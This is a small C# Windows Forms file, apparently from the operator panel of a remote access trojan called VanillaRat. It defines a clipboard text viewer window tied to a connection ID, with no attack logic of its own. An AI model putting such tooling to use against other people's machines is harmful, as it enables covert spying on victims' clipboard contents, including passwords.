using System.Windows.Forms;

namespace VanillaRat.Forms
{
    public partial class ClipboardTextViewer : Form
    {
        public ClipboardTextViewer()
        {
            InitializeComponent();
            MinimizeBox = false;
            MaximizeBox = false;
            Update = true;
        }

        public int ConnectionID { get; set; }
        public bool Update { get; set; }

        //On form close
        private void ClipboardTextViewer_FormClosing(object sender, FormClosingEventArgs e)
        {
            Update = false;
        }
    }
}